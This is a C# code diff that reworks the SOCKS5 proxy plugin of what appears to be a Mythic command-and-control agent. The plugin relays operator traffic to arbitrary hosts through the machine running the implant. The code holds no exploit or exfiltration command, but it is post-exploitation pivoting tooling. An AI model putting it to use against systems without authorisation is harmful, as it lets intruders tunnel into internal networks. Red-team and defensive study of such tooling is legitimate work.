@@ -2,6 +2,7 @@
 using Agent.Models;
 using Agent.Utilities;
 using System.Collections.Concurrent;
+using Nager.TcpClient;
 
 namespace Agent
 {
@@ -10,99 +11,71 @@ namespace Agent
         public string Name => "socks";
         private IMessageManager messageManager { get; set; }
         private ILogger logger { get; set; }
-        private ConcurrentDictionary<int, ConnectionConfig> connections { get; set; }
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        private ConcurrentDictionary<int, TcpClient> connections { get; set; }
+
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
-            this.connections = new ConcurrentDictionary<int, ConnectionConfig>();
             this.logger = logger;
+            this.connections = new ConcurrentDictionary<int, TcpClient>();
         }
 
         public async Task Execute(ServerJob job)
         {
-            
         }
-
         public async Task HandleDatagram(ServerDatagram sm)
         {
-            if (!connections.ContainsKey(sm.server_id)) //Check if this is a new connection
+            if (!connections.ContainsKey(sm.server_id) && sm.exit)
             {
-                if (!sm.exit)
+                return;
+            }
+
+            if (!connections.ContainsKey(sm.server_id))
+            {
+
+                if (!await HandleNewConnection(sm))
                 {
-                    await HandleNewConnection(sm); //Add new connection
+                    ReturnMessageFailure(sm.server_id);
                 }
                 return;
             }
 
-            //We already know about this packet, so lets continue
-            if (!string.IsNullOrEmpty(sm.data)) //If the packet contains data we can do something with it
+            if (!string.IsNullOrEmpty(sm.data))
             {
-                if (connections[sm.server_id].IsConnected()) //Check if our connection is alive
-                {
-                    connections[sm.server_id].client.Send(Misc.Base64DecodeToByteArray(sm.data)); //The connection is open still, let's send the packet
-                }
+                await connections[sm.server_id].SendAsync(Misc.Base64DecodeToByteArray(sm.data));
             }
 
-            if (sm.exit) //Finally, let's see if exit was set to true
+            if (sm.exit)
             {
-                if (connections[sm.server_id].IsConnected())
-                {
-                    connections[sm.server_id].exited = true;
-                    connections[sm.server_id].client.Disconnect(); //We are, so let's issue the disconnect
-                }
-                ConnectionConfig ac;
-                if (connections.TryRemove(sm.server_id, out ac))//Finally, remove the session from our tracker and dispose of the client
-                {
-                    if (ac.client is not null)
-                    {
-                        ac.client.Dispose();
-                    }
-                }
+                connections[sm.server_id].Disconnect();
             }
         }
-        /// <summary>
-        /// Add a connection to the tracker dictionary
-        /// </summary>
-        /// <param name="conn">Socks Connection</param>
-        public async Task<bool> AddConnection(ConnectionConfig conn)
+        private async Task<bool> HandleNewConnection(ServerDatagram sm)
         {
-            return connections.TryAdd(conn.server_id, conn);
-        }
-        /// <summary>
-        /// Handle a new connection forwarded from the Mythic server
-        /// </summary>
-        /// <param name="address">IP address</param>
-        /// <param name="sm">Socks Message</param>
-        private async Task HandleNewConnection(ServerDatagram sm)
-        {
-            try
+            if (string.IsNullOrEmpty(sm.data))
             {
-                if (string.IsNullOrEmpty(sm.data)) //We got an empty packet even though we should be recieving connect data.
-                {
-                    return;
-                }
-
-                ConnectionOptions co = new ConnectionOptions(sm); //Begin to parse the packet 
-                if (!co.Parse()) //Check if parsing succeeded or not
-                {
-                    ReturnMessageFailure(co.server_id); //Packet parse failed.
-                    return;
-                }
-
-                ConnectionConfig sc = new ConnectionConfig(co, messageManager); //Create Socks Connection Object, and try to connect
-                await AddConnection(sc); //Add our connection to the Dictionary;
-
-                sc.client.RunAsync(); //Connect to the endpoint
+                return false;
             }
-            catch
+
+            ConnectionOptions co = new ConnectionOptions(sm); //Begin to parse the packet
+            
+            if (!co.Parse())
             {
-                ReturnMessageFailure(sm.server_id);
+                ReturnMessageFailure(co.server_id);
+                return false;
             }
+
+            var client = new TcpClient(sm.server_id);
+            client.DataReceived += OnDataReceived;
+            client.Connected += OnConnected;
+            client.Disconnected += OnDisconnected;
+
+            return await client.ConnectAsync(co.ip.ToString(), co.port) && connections.TryAdd(client.server_id, client);
         }
 
-        public async void ReturnMessageFailure(int id)
+        public void ReturnMessageFailure(int id)
         {
-            await this.messageManager.AddResponse(
+            this.messageManager.AddDatagram(
                 DatagramSource.Socks5,
                 new ServerDatagram(
                     id,
@@ -115,6 +88,35 @@ namespace Agent
                     }.ToByte(),
                     true
                 ));
+        }
+        public void ReturnSuccess(int id)
+        {
+            ServerDatagram smOut = new ServerDatagram(
+             id,
+             new ConnectResponse
+             {
+                 bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                 bndport = new byte[] { 0x00, 0x00 },
+                 addrtype = (byte)AddressType.IPv4,
+                 status = ConnectResponseStatus.Success,
+             }.ToByte(),
+             false
+            );
+            messageManager.AddDatagram(DatagramSource.Socks5, smOut);
+        }
+        private void OnConnected(int server_id)
+        {
+            ReturnSuccess(server_id);
+        }
+
+        private void OnDataReceived(DataReceivedEventArgs args)
+        {
+            messageManager.AddDatagram(DatagramSource.Socks5, new ServerDatagram(args.server_id, args.bytes, false));
+        }
+
+        private void OnDisconnected(int server_id)
+        {
+            messageManager.AddDatagram(DatagramSource.Socks5, new ServerDatagram(server_id, new byte[0], true));
         }
     }
 }
